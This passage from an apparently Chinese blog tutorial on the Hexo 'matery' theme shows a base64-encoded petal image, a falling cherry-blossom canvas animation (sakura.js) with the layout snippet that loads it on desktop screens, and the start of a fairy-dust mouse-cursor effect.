5DJnQrA3pNsGKQC5V65BRl3SV26KmKSgTSHcNX+vO0HIBbCVpaxYSOhe2YH+AXHD3uxqVXgetGj3yEZC7J3q84Fixqux1/lxTmU382YRuZ6Otny0iFH4KnSBFb7bVvKzxBvINxDtyflPiu5NHy9D6CUmojRqRSCWV9mEeyVHv7KEKoHOmUdXCm5qP65xymGfK4fBxBNLQTogxdB73g9Rqm3Fy3MBxA8iLmWme6dXumZMmZWTCMpyTgRNTngBkGSfCj4DtRE6ET6BNMGUIk8gj3ScwTQAmSZnABPEIqDRxlEHaXEj6hWjtCpNGrXZ4AqjX1Hr0x4EjHq09nukYLihDJ2k4V84fa42gdj1D+Kwd5qKwMxtnodgfFOMtAFXpe770s5BVscc9ZM6YjrXmSHX+2pxBLchVQLYASHNHHgg76Ezfk00kykBM867SUw5RTLzKiE9POczJQFejHDbxXGCjHG4A+diajgd0jn0OQ/YjciYzwcmNE8mJ5BFAAKLziIQBwgRognyCpwxqAnmMtBtHiEcQA6QxHssD5AOEATBC/EKbawXg1uwTqu5GL6rr54+V9Dg4XnBgXELZjZriqngElhxEXg4Hr0aMy+cN/2pVCbKmwlNVed6KKviboDamM/Os8R4ca48UO1LwN8rfNNibMg6QO8y6z25W766ZQhvvsfAotwnw0cCPE8ohZ1M19ba9RTy3Ug5dQBIw1fJIMuDoMfaThlURjF8vdG/rnw4gzRZ0PGmfJ590yBNHJhtt4tGSHUCONBwhDBCPkI0AjqCOAI+AHyAbQB4AjIAGyA8SR9KOAA4QBpAHAWODxms776P7bXMrvGBw9WhkeAscb9EX7wTXu/Jr3ik8fFpzlA6RVntnoOU/OyCMlBuqArc/CpMm6o3Bjvkp9+BdQz9p/Jl3fPdkx+E9O0rNUJ2orcqsoTMhwVua7QmAEcPk+HxKJ5TDYol0Sjk8E8/FarQcICwgoQ2UgyelmGX1eZGmb2sDyAuRDBoL0J45Zddxes8H5mnAYMndBjM7SjywGDRAGgsYDpAGkAnAIGAg9AlxgHEAeICQQAzl80rxWE8xwMbLc5CLTOi0qP4nrgcPGOICz/rasPvddUlewNabfyfog9K7QmXnR5ldLDVIvEUUqR9t3rEOgwMlWvTCtVZT9SHxU4O9fb7sj8PxqDrAjVbuY9WVj2jQorACCZaFvLPSqPEis3fpZHiDcthVG3rKISeAY7gcRn2zcLlKOYaru9CWZv9pAdh/+DewE1K9jILtTPbEo2M65Hw8ep6O7joKOkA6AjoKfoR0UMjxHyOS5IT+d7BeP8TvmK8HsB5XkY68EWndXVy96Xx6H2hxeVnW9hav9Rwc7zEi++qs41XKTy7gWFXA30ok+Napfhf2TBG/rRYKYAXDD4jvIN5IvtP4DvJDg30AOnoaJM6RGlek406rsfQiB2VETVyaQ+FJFtDEKZqHdbNgby6HKtQDL40XpEI5lEod0mef9laHnMVza+OG3FLsLYK8BJCpYEkGPAvKDj8o03T0KR91nBIGH5X9aGYHSiOFI4QjpAPIMdJnpRpFImQmR8RITzq59BGnQRgf4yD7eQTQF6pCzRJAl14tfscJ64ZzLZKo6hVepkHqK6u0SpaTIvu5RV1Jh2+D4/XokUtq4JXoEfPrlz6B2ljB+wyIeINY6o8VKFEB8Ue5/hPgG4gfIH7WrjeMPwG8H16fDvvf38TSfcZCvduiRrj2VqoCngIUU6lJaiAsX+hkd99ri0wLi0rGkDkDoxmTyzYPCQAfEniY4ENnhV6637WTvcxKtihyA8iVdfjXDGXN7T0SNML2Non8lMs854E+JAgGcCincisgsgBARofaQCWI6ew+PTiiXpddract0m2WQeJaY7JFYwAxagSSptlOrB9U7529Cs+8DLVLXuKc3LjmTWuVA8g9yD2APaChhSc4bcqcyqytRJb31ijXujGXGzK50QCln3L9LDTBt6bLCP8RIz6oVMEy0tPMtspjUPQfY0DczT7pONYBbHOHm0HV0be4DKq6EGq2Kop0NywVzDEzanJ0soejA4PNJz7TiXhu7mTOLGqcRfvRpGj8TA4kgx0AEzANtkpG2GBwA8gHMzWGN3ayIPUbIxJIzPjUp78refaU3JO7zKCBgsV7ZwI4BFjIACVAKSLHiCzZgBEJ1Bg1SSUJicYR8AGw3dVUmVgfAm9KE5ogHYv81iel4H6H104uKtkZkiTl0ryYWgtbqHYRtUyQy8FlAeTcw7gH+AzwFeALyCcQewDDdeuGK1Ei76k13tGQYetUf0D+U1Fv/H0xx+h6E/QDrh9w/xHRZXEYRBkUlxqLRmUwnEN6d/BTxEQA9OBD2+SYdgYZYHUWsSspFJ3Qs8idLuQhIs90dBzGVKLO2dyItVZYT3onI1DMGcAAR0SiTfCi/jl3KA3wByiH2jrZG0Cuptjf9pF6LJolpYa0t6zJP3VUgmsgMDD0ACvoDaIOhA0tfa7ptXAAkQQNEAZSR8A+y30MwqCsAw0DTLHttFmzLGkt/a4jXfPC3vgJ11sHDB+QH1EiGwUYTp2fDjplovnZGq9czqAWDTQ8AfYMyGFGgAYpomdjKscoF2lhjVz6aPLOmirvUe9ZRpEO4VDYMT/lTQn8Z2nKvKt0sQtjpjBlqiJ47WZjBkjgJ4kfMLzJcFBKGR5eB5wETwabMrDfwQ1IXVNr1k9WSSQc6shT5mU0x4poRerg6UR9aEE5vFCFRU0iFpRDL51smymHuEQ55Jcac9v6Z4kgB1sAUJy5rSqoCHtOBA5yHwAfIA2CDoRGQEeAB0BjRJI4SBjoOoA+QBzhPIJIcR0DoAMMQzRrcAA4wnEAtUcvaHi6w57vvI4A65n2xtaJrV3ZrAakcrhrBlZ1zyx0JmRepoIMxJPAEZBTRZ0I6iTdpBq+8bS5dNpx1u365FVw7G+z9n1lQMezUZ0yjlOYMe9AU+uZARKa02vgJ4g3gIVVo59I9gboE9PkTLtSqiPoGT6OSJ8HCPsyilNqf2ym6K3eSHZ+MKWTfUo5dLsAfxdcDufMogfXQjms2pB7BKMmd5TD2lnvKIdq8nnb4PgGkGsRi1tzf8NaFjvQkXDIP6fRjuloKR1gNpZ0NhoujkNJsweYjoKOhB0hHICIsiR8Ej6AVuYkIxKNmUgNBWCHs3BKOrtetFRj+Jkh66+Z8fEB4gPSm6KbPgNffX/qxsNVwdFP7Wn34cwIsdjeloPSu6ZNGSDpEO4kCsc1Pch7ZiIv39cBHIoXTAXEt9aAKWM9wZrBO+roDvGjCEzUBs0PkOUEwzfQfmiwt2k3fI5vH4Ln9kLUWCvBhAGii131GC9mqDZ/f32jZihA6olItenTzaxSpXBDCwZr525I96h5rlIOUTrZCePxABXKYYXTnnJYB9pZ/G62tQHkCUAuR1eYYoSbsye2IOT8Nh3S5KOmHLONZCIYg+J1OFyqTZjobMfnM0I6lo72saTfE9i0I48gpjjgpbMuBMtZ3xcQfmwK1+UnAySrVcA7xA9An6hOjcX7W65KqSmhTGgVBTi2sGSAcQToJIv/d/sZYVGUJcLkjFgR/+UFtYpbNcdbne2aVhd6YIkANfOq39rMY40U222In8TP0s0uQFnGfKSfID60Hw4AhcHiG+v/fKfAba6QFzOfy8EkziiHmC0Q5OXrLN1vy8GdTodZPJeLv1XnIXPX2C5D6ClB2ZuJV6UcIntQDocl5bBXUfPVD3aLHjeAPN0tdqUx05lWRZBVSPwl1dZOx3z0Q8p5sJSOlEZAJRpkoRKiCueWmh+DfghGk4Q2FXAs98FEFn62MJXmzrr4I5u69CR5HVWpcv9lmLnS6BCG9q4PSBnRVS3FS69SMdXb+6SqxRhqJ6NSujh+OrfHCq88rYrdYsTgJEU8bbZqmZYT551qFF510P/CnnUxyhOGWZFye40UP0paHXxqcjbZCguFNyS+6+ifcDmSNWYMWh2v/J4DGC1neLJS/zuRsOsGBqwCZG3ANMqhIU3RtOGHN8qhRNA6Xn1/7llQDlvTO1L7QjnksbB5Unqw7bI1ajaAPEt/xjib+orlaOXFZgmkO3zyacpMadKQJqoAG1QUyDFVdXEBmVGnm4qyT1XyqeCYQWQFMB5Zt0F2rrPYdtpJ0EfxPnmr3imK0ZYPyD/g+pD0AffPApClm918vxEeOt6n2HMySFlMIDW8U/vXW+vx3CTgOjhqCXr3oOip8Va8+ENT1AHepeoRow4gUeuRc+RYa47Ez8Ke+YFasyR/YkhvMBx4cEd2YEgxYkOGBnJKc+/JVTrZGXkYI62t84lpSTmsqkmt2VLFcwvlMGXH8ckWlMP60bI1as6jb0qXe1maTbxmyiHOND82yuEGkDeXuoo/JMC9zEWWSwWKRAeR8zRNtJQ5DBMteYyX20RoghjRYWhEltEbjiFcoQmOCYYMx7HIo0XKHduPEAdQyyhyBjCH/Aj3zwAJHOI6jnAcIP8soy7zBfgEkeGiFh1s1zzis5CwHnFufUsYCGOxsS0lx4U/1q+6D14Ax6VKei7g+BOuH6pzi637rJ9FiOJHAcffw6O6Ct2q8KvrAHi5zfAG4kNDOgRGZKA0OVSEJeABmDV6s5zhYwCk2DdqOhGQEjGq6Yp1e1wG8o5RyzwI+jLlcAY+Wkc5ZEifcQfkZEhZpY7pG+VwA8gHAfJjmsGwP6MaYh6y7vxGgD5pOh5Rx2ZQABA6llriLrZzQti6TwxFn7HcfpRwJNsYUKTmWGyfAI1L5BAgHBWNoUMwRQIAJX0A/gHwE/JP1RSy1iIhL2XIiALdl+5VLK0AcQfaGKM8wMyjYU2t48JWo43Kvp0i3cnrfuj44xJAa70xhtirXNnvcP8x0wabX8xPQFGLDL717xB+LzXKSiX8CeB3CD9g/ImU3ny0I4UJU1HVMQDZ54jKDJxyeTcsTRBH3o8Y8zHuZ5hZLJojyNZUOzFSYxHPdSt0pVKTpE4LFbPLYSCgt1vYpM/KEHpJgpL3LodRpxwOEzSkGX85C2pYBXP55nK4AeTKymVEpR4cNVA6H1sRyMxRUUfMPinrSOoIV+hDUtGYCWm0yr3eYeZi95exu89A4oiafsfn2u+lh9AtxGLGr4i+Ric7+MY/Cbwp0swfxcY0NxLbPPtYjr5m1r2DcZg1/1mSLgOMmgGSABm+3/H4akaW1hHwktzPnQrgdXB9LikEt1repchebA/0ozVq4vI7gN9Lal3qjfoB8HcQP0F+YLCJoGTBSHEi6tFTLko8hTSg6SS99VIWDgBzsxhwXH8PbVMbxVE03dyIVBsuAzEUyuEseTajpWNp4qUTERMDka1SDg3M8R7yYOBneW8tID2hHK4IaG5rA8gIlHbDuRDDSgBED7NM7McJH9MROY+Y8hGDHeE8MJWONVrqXDrWOrYmTnVFjJbk1KJOICwboqFTHRRTY8nUCGhWtn6H8NbAEDPfWHNkVTyclVXVc+WnHRmV1zy07nR0q3P3OryAoXfujj43bOgPCWFcGxi3xWs71uaJvNNndMwzjkABxTLb6K1J86PMQv5YcK6JMNUCPpDdgx6IODlWsLESqVWhh3RBtrw0biog1fT2EuWw8amLTmdQDuMNh4kXMR6LFlTLm7UQzwVzVxuO59eYutGdSjlEa9R42iiHG0D+ykp2BoS1P8PTZoERGpn96Ee6T0l5gg8ZVtTD59pjdKZh4UnjPsGsNHSaN01YNsiatazMQ8k8ut+pdLc/AH9XE3rFB1zvUjG5b+rX+igp+EfUH3UohvdBG3QthsPLAVMc6QvQRZLnnD28Z7/vGRgdzdq2ejTyel62EAe/aVZWxSaqNFk1yXqfU+ei0hP1xbkO2TNoajodohPxeOOHxnTgMftcuuCi9qdSYaAXsKqpfp07VKnzlREfmzKmfWqUQxWAPKMcVt58bb64kAtBNWUVyuFUSsGCnKX6cVKH7CJHypdVyp5y6EByx1Q72Xf0XjbK4QaQ50FL7vt4Xe2rCH7Hzt6lhYmuwbI+pknZM7JPNGVQM0gCAXJh3jXBLFPdOI8x6pOzp3ZElsIkKJNe/G5wAPSpaL58QvqE+6GrRZbtOAj6BPDZcbIPAA6Kn3O9Mfo0zpD82UXdlLk5MJJFqIIdOCqHg6NUPL8FFnYO6Lfw8TprZsGn9tnKAL8rao0/Oz71T0F1249gyhTmzMJjBm+AfofxB8AfSPah/XBQknOSN+pdEZeNHcFQI0oC0OTBISqdbBR+c2tnucOHGPUBh0hXq/oQTymHkR7n7sSQPGorbVzoaR2e5k725Q+1dZ87yiERjRokwJv02brLITfK4QaQF49dCwHTFimw7uhrgU6Zud7R/ZOZk6Y0eFbyicaSNndAozrmozmKpAplD1O5Tx0Uz+Wxk4BjKZfPHWvUDjU+55/4LKM+8wXNV6WaS310w+KuSPEowwhYIpBnsAt/bzFUfCgKJhUQDNAUlja31bwsuu+PpdTz6E6uYhOaVXZ+j1qjfkgFNGv6XKLIOWLELFVGVJCs4PgOw6RkChHG3Im4FWfAEjkyR9SIMmyNrlGD0ghplMPs8GFAOh6j4dJRDtFFczEwXoyra6m2mnjBADPYMV7TLcqhmnJT9yF3lMO54VKAfsJMOZxCZGONctgAeKMcbgB5tvvt0gUFLp1V2VvzZs+MT59wKPau7i63ifQsWKZhAkszh8yQjiJHBqOmzDsiSzoyxnxi7CduOzanGLX6Y+vUqgLBzDn+0Qm+/ixMkd9jkBo/QHyUlBjK2RESgns4ExjIyVpjnIfAvTRswtHRTrbV6DLKZd7Cpjlpn+UGaxf3koxZiAp/FKGJ9yYiESD4e0mr3zuLhBjVAWJ+EfwJlt/lbyCjeUP8REqf8d69dXx7Be7WZVbt/Hp8LAUgiVLXMwOmYwMmGcFjSbFr57qnHPqVWsMFyqF5NGpS73K4VLmbO+Id5dDkcFoTz50ph1ZMvKKTzUOGRps79AvKYc2hNsrhBpBn3cWVUZQKhqdSU01CUcIuTZ6niXk6YmIAHYYcpl08wD0sF5SGYtwVHWvHAEMRy2W1Ykhh5KVqYwdUybKQH/sA8KNZlM4Uux+dkX0Flx+ztmGZDXSflCfAS1ods5klnGqgV2uKGVBudUir21BMySxHw6bVJ+N1XhAP77FzRtCYHyifyRukH/LOWjXkx36H63dVemDxse7UeCqVcAZM4A3UTyR+Kg1HTkVBApESR/eim0usxmaOiK5qt9oIHLzR9Joobi803I9ZqzZqfNEpPqUckieUQy9RI1kA0pA+Qhl80divDl2wEuTPlEPUIfaMVcohFaUASk3xeKMcbgD5QIrNfuZuPhBUpmLWbVLlO8uY0oGTUsqeYNmC2yVKSkQTzo04qyFumzCMU7Xq3krCdSyUippuF1TGISJJ/WTzbW6c4zcFYLzP+ocxHK1Cs5PxSNIElY51bbjAyRK5ogAhkUurqgNA5jbqE6XZHC3WmadNzpI+yz7MWdpddSc/K+BJ/vv/2t7V9cax5cYiT/eMfDfJBkHy/39dkJcAC3sszUf3YeWBPB89GvlugnvzsixA8FiS7RlrupqHxSoGoU9rEXgZ/cZpZ4yP7rz3XTKNJBUfUL1S+BDSq96m/hrGnOvsG+///08/fx2WQizq5Bk/iIPlMAQZ3Q22SI899g7F85bDIFLRbjlUA+oSBBmWwxNdPe9LvCbLoak6TwLDclgNWF5ZDj1nSo1DqPmFhvZKrkkkQaKPBxq+3hkt4ndpUUDj11Iql+2G6wZsFsPmpqDGEmThRIQa/R7x012vKoxN4TR7+GUaPcpYfTDNDm9xzLyOAAbeYjD6NoQMu4K80uwGq1cAV57XTXZZoVKc5NQAWAx7N8NwRVs3JTEjOX+dJPr8Y1MT/HXKU8P2FytZW0TbdeyLsZhZ7MnfXlG2FastqWfYBb1iVLkA+BDgnaVcAdxRZIeFVfATC0xZHLOzZc4vKuLVZMt3rwasxas+CcIs2v8az3Ms0Lqjrs1y2KyJOinZrfrjYYhcjdjFe+DLbth+myyHc4RjE2qeHTXyYn/kcyfD3HJobfaxizKvCsW0HCZBPl83ez0SoQioJVw0BZzdNNPFRhJyWkxE7/W6sWzWqMT85h9bjdkrEvd5kQS15+cEBT4AKiXcLl5hHYePSAuXzS1UaxdlYnNfe0yzCKkIoixyExoJlilwAuI9xzbw7aM6GiM77NXiUAlcufavuSjQxoIYqvgUCnm4+jgJUN4q8JCJUKLtfQgyuLIn8OAC8scQXPARARN+/FZXp+23012u24baQziexItJkCEH2fW5HnbxhdpixIIhnx01Zu5IibOqVvtsOexHW/RVsEP2OFoO2xIvqleQVHmhVj/VeS+Ku5nUDpZDhPC0ArUULO21Vet/UbcKpOUwCfLl225Z/UijGsO4+qnv+Kqq7BfVIrWe17vKJrRKmAxnTjteGemOFJVICFKhRWQLbiB9tUGM4ThB0qZ8xpb0TQA76eM/MPuA8RKpPje2QWnwHcL3el5udtLtdDMxKEEbA96zfRBzlYgh3LSESM+FRA+s8IO2QKWZjeWT88gvvBrq+w3Ala5EX7oThu33/MlWKbog03qNP4AgSeEVIu/xcbWl3Ki6q6o3NHaO2Ju+2AqHRO3WK8Qs1Ng0ky8K2A6WEGr2I0Fir2OHdRChnRec6uNoOayfhKjPwjBjDKeF58aXrUgfu+F0j2qWQ0YfclgO4zXE0bptOSzmHm/Z/a3HpUDuD1hZnDw5LIe+uoHdcpijPkmQk4r99kSA/GX7hc9dGnomOJflbtedhUZYrVAYqfTVWVJBMRh9pKZWUmSL0KuWzK2hKVaANxg2F0u8XoWItbWzMGwC3tiO24Ir4Z5sAW5U3MWw72fd67nwdDcV9ZyJXoeQU1+UfuXFDhoRicfxIVLiPFdi1YL0ZWQq/v3H814kfbvy3N0ubXwn5htjedYlfNM/ew/Sj9Q/AX73X+VdRK4+siMPQva6ngiaB9c+Dft3IWR2kUQMJosc2ojHcFrpfTyoeGgFJ6FmJo0DmYzB8e40AL+wHHJYDqOK9C2HEtmQ7qhheTr+t2AgUShsshzGjKYWYJ8sh5t1JbtZGeX6dAOLYzf06bzyOccu8Q/bg/zFnZJPup6EAaU/ji/6amOpOJW7VewKbKA9hHaVqu9c8AbRM0ROEC7i1sNCgRn4gKAKpIrRKKgg7lTuVLGISNtgMAEqBcYTSBEDsSuxoaJSQVsLuVU73WEQwXo3qBd7AmGBShEnQlfRPWjCfy+d6BQaBDk+BCoqUAmCDEIUFVXt1xRaxWi3WHz1AzWGvSPxuy/OQh/2bip080239O8LIBcUuXBd7lyXB24P27XgZEatFbUUoO5dRBlhYd7K9dZGWAaDxA5K+izUEE60XagJD3azHKq+Prq3SqwarCnXk4BztBxOS7xCQW/ZkKu45dBWgdyj1/nKctie+7TCQo2oImN0pz0/lUmo0S/lmEQS5K858unN0lVGweFeKl+pfu34pGImYjBUtfrx+Ouy1DeV8w+LQCtTCtRUhQUGwSaGXSopoNgqShGiyGZCEwK607VlFewnH1zU4tPc2OkFSVwoPBV3FN5DXTVC72yySqvyIomik2OrFqNtJfPnYqshopJEGStrpUh77K2BD4A3GtwSSbuA/N5aAGOZFhpBjrEl4OLH6e6Z/gmRDyzLhwgeti7GtxXl+hjzgI0IdgKrfp5vfnXfo40fpE7HAE6WQ5Wj5bDGUgyVrkuN+HlfvcBSUMywLQqW2HLYwiAOlsMnJZuecWGL/7taif1cAO5dqHm2HPZcyTajo3EzkC8shxzP0eaAi5eNzPlhUmcSJHx2bEQPEvKLa4y/w7JT0opJBfZvpW7/suB8uaOqop78QrKpiJmb7BYXZ7t4ugVMSDH67pwWEdFOzO1ardPOZSVsWfvFqY9NYaZh5ShRUpW2Lwf49DF2eRMFisXX14qvtKX4LKeKq9KMpCGzdxg+YHyH2QXghd5vfA8xZqxCYFuLwAtELhBcAPmA4Iql3LmWh/37P9vyX9/pA9xy3H562CLYKj4OkjN87vtZOwoH6cgQasYbQnr1JxKWw1PshVF30HBZRkFYrYfn4rxENJm0UKRPlkNBHNnj2at5cjJVvILU1yM2Q8l+rvtGn/Ol5TDeG1jgA+M2hWZgCDTWyBXyxShC4h+SIFfhJ/L7P7enZYQSUIH1suP2b+sYreDrcpWRUi3H5MBR6XzlzJBXcfxAXRcnWLe9KSoH8am2x4uvbVUF4NWg+lEbbX2tf659X/HSSAjVHYKrLweLY7XZO5vNUXiF4gcMPwD8iNTuadCbF0gE2raUndPyjmp3nIuhokZuJbAUSBvbKXGEfCJIXy/g7pZP7ZMuOERKz3xE/sJyqHv07GbLoWpXgH3PY/Qhd4O9LVgeDxBvo1+5W6/WPlsOx/NTa1sOFcqwHJZZ5JmbkOwC07PlUF5ZDs3XDckOyJuH5667jVbCZDls/09Hy2EiRZo/thzt7zuKYLmbX5fFL7rf5dev9CF5+vqwUhxegZi5lxiGcucQwQmgLCJFWzJ4FLzhq9CwGWqp0wykQWQXwQbRe5TYG0R/Ts/Jwn5yR5EPMdypvIPyAcN3KP8mJt+hbcOgfGDRd8B+Anpl0TvWcofIXv/jX/fyn/9NOStwoxNM9Tgv2asfWZcC2W2IHOY3I4ldLNhqDzzvQk3zWE+OGivlF5ZDBWzzJZMHyyE+Ww7Fd1tX1ch5xPD1/96baxKODpZDErUIFmMfJejH85jR9JavHSyHQLh5wmreXjeLTEJNgT521LX45kMMy6HJk0STFWQS5J8KAXQjJOL1deexx8OD+vMkVeJpNUFcwMaRTwgee00x2lKqoLxXsEjkGRZj0U0hdxRViBYAqhJVZJ+BkeqhGSKxfOzDY6tbD5LFa1R7RJL61lPVgQcgV4CbgBvBW/ijf2DVd+pyheABq5vsVqnrg0UqBGQp3j7YK3BagccDKAWyAdirE+SHzxxy8WAHU0GJ3poVhVY77jfvQkbbRTCtJujOmaiedAgm3ntUHFZJWFgO8cJy+LzE0ax7sjvxfmU5bCERfLIc7m45xM1dPAfLYQ+tkGPLtVWLbW9OO8Yz5h73seXwuGsd3XKIlG+SIP8/SLG3hMSDC8rdUM+C9d2DA+bj0fNBRuaRPBkdJxeMpy13h0GMoYwKFpSq4D+th0xCCDZ5e3vH9e6rIlQegNwiJ/HUeosCFgrWMQYpTvEiuwA7jBU0Tz5XqVQxz7zEQ8gHRYzW9kxpRdG7lWXzz1TI3cTKAn77jVIfwOMeJ/wgw/MJ8uMGfIs9zlsFz6u/4r3C1oLCR8SGEQrDJotXmqclqJ5jsL/aMB+Hkv3Zcng8wf7SctjCLvhiy2FUk7YoqNUPExyTjJhWkwvaCE6zHPp4jy/xIrZVIB8Vgs+WQ4G5UDO3VVQh+94th4XA3m6ecap3JVv+l5bDRBLkH6/6RNq0Xz/lWrF/8/FGCcVSnm7iLUdwVIife0DsjXrBPPHB3oeU+HFwJHPP1slS9kjeeUDlHYIikMWrRHfVmKgRpkrxIXbFAyoGwmBEPa9ENUqt7DtppqdoywKaQR97PAeOPSo+s+clU/WAhd4BEIFsO/i2An+zsfpiq+Bfzi6YVAPfTsOhMis0babv7zkWPlsOD5+fxmPMWyMC+HF/Le6FboPZZTlYDlkKyl7dctiFmhgRmpRsQkevr/chg9BCqHmc9XjT5bGC/Luqu2fLYcuGjNxLfrUZsSf7JJIg/4SGpr/xgrgUWD4qHn9dQd1iWZN6ehifK85hESZfVKXyC7HmUAJ98bzMIKoGFdJtP9N2Kb9eawxc624vpXxfAuVN//CAHKJ6JBTduTqW6SYAVU90a1sCp2Oo7BX2l2/HP7jXQx7jc0jnEGqmER3j1JrAi7nFZ8thzOabQYovAmeJf09jT1FkQTpxayjZ6NKvVoOd/PhPOY9tiC8sh17sz8/JCbJbDreIO/tqkSEm0n1auCvTCaVbDsMB6q4dwBbFEq0A1OEzbJkYmlfxH3uoZFqSEolE4ssDZSKRSCSSIBOJRCIJMpFIJJIgE4lEIgkykUgkkiATiUQiCTKRSCSSIBOJRCIJMpFIJJIgE4lEIgkykUgkkiATiUQikQSZSCQSSZCJRCKRBJlIJBJJkIlEIpEEmUgkEkmQiUQikQSZSCQSSZCJRCKRBJlIJBJJkIlEIpEEmUgkEokkyEQikUiCTCQSiSTIRCKRSIJMJBKJJMhEIpFIgkwkEokkyEQikUiCTCQSiSTIRCKRSIJMJBKJJMhEIpFIJEEmEolEEmQikUgkQSYSiUQSZCKRSPzZ+B+GrlwhibMxxQAAAABJRU5ErkJggg==&quot;;

function Sakura(x, y, s, r, fn) &#123;
    this.x = x;
    this.y = y;
    this.s = s;
    this.r = r;
    this.fn = fn;
&#125;
Sakura.prototype.draw = function (cxt) &#123;
    cxt.save();
    var xc = 40 * this.s / 4;
    cxt.translate(this.x, this.y);
    cxt.rotate(this.r);
    cxt.drawImage(img, 0, 0, 40 * this.s, 40 * this.s)
    cxt.restore();
&#125;
Sakura.prototype.update = function () &#123;
    this.x = this.fn.x(this.x, this.y);
    this.y = this.fn.y(this.y, this.y);
    this.r = this.fn.r(this.r);
    if (this.x &gt; window.innerWidth || this.x &lt; 0 || this.y &gt; window.innerHeight || this.y &lt; 0) &#123;
        this.r = getRandom(&#x27;fnr&#x27;);
        if (Math.random() &gt; 0.4) &#123;
            this.x = getRandom(&#x27;x&#x27;);
            this.y = 0;
            this.s = getRandom(&#x27;s&#x27;);
            this.r = getRandom(&#x27;r&#x27;);
        &#125; else &#123;
            this.x = window.innerWidth;
            this.y = getRandom(&#x27;y&#x27;);
            this.s = getRandom(&#x27;s&#x27;);
            this.r = getRandom(&#x27;r&#x27;);
        &#125;
    &#125;
&#125;
SakuraList = function () &#123;
    this.list = [];
&#125;
SakuraList.prototype.push = function (sakura) &#123;
    this.list.push(sakura);
&#125;
SakuraList.prototype.update = function () &#123;
    for (var i = 0, len = this.list.length; i &lt; len; i++) &#123;
        this.list[i].update();
    &#125;
&#125;
SakuraList.prototype.draw = function (cxt) &#123;
    for (var i = 0, len = this.list.length; i &lt; len; i++) &#123;
        this.list[i].draw(cxt);
    &#125;
&#125;
SakuraList.prototype.get = function (i) &#123;
    return this.list[i];
&#125;
SakuraList.prototype.size = function () &#123;
    return this.list.length;
&#125;

function getRandom(option) &#123;
    var ret, random;
    switch (option) &#123;
        case &#x27;x&#x27;:
            ret = Math.random() * window.innerWidth;
            break;
        case &#x27;y&#x27;:
            ret = Math.random() * window.innerHeight;
            break;
        case &#x27;s&#x27;:
            ret = Math.random();
            break;
        case &#x27;r&#x27;:
            ret = Math.random() * 6;
            break;
        case &#x27;fnx&#x27;:
            random = -0.5 + Math.random() * 1;
            ret = function (x, y) &#123;
                return x + 0.5 * random - 1.7;
            &#125;;
            break;
        case &#x27;fny&#x27;:
            random = 1.5 + Math.random() * 0.7
            ret = function (x, y) &#123;
                return y + random;
            &#125;;
            break;
        case &#x27;fnr&#x27;:
            random = Math.random() * 0.03;
            ret = function (r) &#123;
                return r + random;
            &#125;;
            break;
    &#125;
    return ret;
&#125;

function startSakura() &#123;
    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame ||
        window.msRequestAnimationFrame || window.oRequestAnimationFrame;
    var canvas = document.createElement(&#x27;canvas&#x27;),
        cxt;
    staticx = true;
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;
    canvas.setAttribute(&#x27;style&#x27;, &#x27;position: fixed;left: 0;top: 0;pointer-events: none;&#x27;);
    canvas.setAttribute(&#x27;id&#x27;, &#x27;canvas_sakura&#x27;);
    document.getElementsByTagName(&#x27;body&#x27;)[0].appendChild(canvas);
    cxt = canvas.getContext(&#x27;2d&#x27;);
    var sakuraList = new SakuraList();
    for (var i = 0; i &lt; 50; i++) &#123;
        var sakura, randomX, randomY, randomS, randomR, randomFnx, randomFny;
        randomX = getRandom(&#x27;x&#x27;);
        randomY = getRandom(&#x27;y&#x27;);
        randomR = getRandom(&#x27;r&#x27;);
        randomS = getRandom(&#x27;s&#x27;);
        randomFnx = getRandom(&#x27;fnx&#x27;);
        randomFny = getRandom(&#x27;fny&#x27;);
        randomFnR = getRandom(&#x27;fnr&#x27;);
        sakura = new Sakura(randomX, randomY, randomS, randomR, &#123;
            x: randomFnx,
            y: randomFny,
            r: randomFnR
        &#125;);
        sakura.draw(cxt);
        sakuraList.push(sakura);
    &#125;
    stop = requestAnimationFrame(function () &#123;
        cxt.clearRect(0, 0, canvas.width, canvas.height);
        sakuraList.update();
        sakuraList.draw(cxt);
        stop = requestAnimationFrame(arguments.callee);
    &#125;)
&#125;
window.onresize = function () &#123;
    var canvasSnow = document.getElementById(&#x27;canvas_snow&#x27;);
&#125;
img.onload = function () &#123;
    startSakura();
&#125;

function stopp() &#123;
    if (staticx) &#123;
        var child = document.getElementById(&quot;canvas_sakura&quot;);
        child.parentNode.removeChild(child);
        window.cancelAnimationFrame(stop);
        staticx = false;
    &#125; else &#123;
        startSakura();
    &#125;
&#125;</code></pre>
<p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p>
<pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
<span class="hljs-comment">//只在桌面版网页启用特效</span>
<span class="hljs-keyword">var</span> windowWidth = $(<span class="hljs-variable language_">window</span>).<span class="hljs-title function_">width</span>();
<span class="hljs-keyword">if</span> (windowWidth &gt; <span class="hljs-number">768</span>) &#123;
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/sakura.js&quot;&gt;&lt;\/script&gt;&#x27;</span>);
&#125;
&lt;/script&gt;
</code></pre>
<h1 id="添加鼠标彩虹星星掉落跟随效果">添加鼠标彩虹星星掉落跟随效果</h1>
<p>在<code>themes/matery/source/js</code>目录下新建<code>cursor.js</code>文件，将内容复制粘贴到cursor.js即可：</p>
<pre><code class="hljs plaintext">/*!
 * Fairy Dust Cursor.js
 * - 90&#x27;s cursors collection
 * -- https://github.com/tholman/90s-cursor-effects
 * -- http://codepen.io/tholman/full/jWmZxZ/
 */

//鼠标点击雪花特效
(function fairyDustCursor() &#123;
  
  var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;]
  var width = window.innerWidth;
  var height = window.innerHeight;
  var cursor = &#123;x: width/2, y: width/2&#125;;
  var particles = [];
  
  function init() &#123;
    bindEvents();
    loop();
  &#125;
  
  // Bind events that are needed
  function bindEvents() &#123;
    document.addEventListener(&#x27;mousemove&#x27;, onMouseMove);
    document.addEventListener(&#x27;touchmove&#x27;, onTouchMove);
    document.addEventListener(&#x27;touchstart&#x27;, onTouchMove);
    
    window.addEventListener(&#x27;resize&#x27;, onWindowResize);
  &#125;
  
  function onWindowResize(e) &#123;
    width = window.innerWidth;
    height = window.innerHeight;
  &#125;
  
  function onTouchMove(e) &#123;
